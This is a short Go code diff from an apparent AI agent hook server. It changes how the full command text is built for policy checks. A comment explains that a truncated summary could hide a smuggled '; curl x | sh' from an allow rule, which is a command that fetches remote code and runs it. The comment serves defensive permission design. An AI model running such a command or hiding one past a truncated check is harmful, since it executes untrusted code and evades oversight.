@@ -51,7 +51,7 @@ func (s *Server) handleHook(ctx context.Context, c *conn, env protocol.Envelope)
 	// Policy sees the whole command; people see the shortened summary. A
 	// truncated summary could hide "; curl x | sh" past the cut from an
 	// allow rule's compound-command guard.
-	full, kind := agents.SummarizeFull(tool, common.ToolInput)
+	full, kind := agents.PolicySummary(a, ev.Event, ev.Payload, common)
 	summary := agents.Summarize(tool, common.ToolInput)
 	audit := ext.AuditEvent{
 		Agent: ev.Agent, Project: sess.Project, CWD: sess.CWD, Tool: tool, Summary: summary,
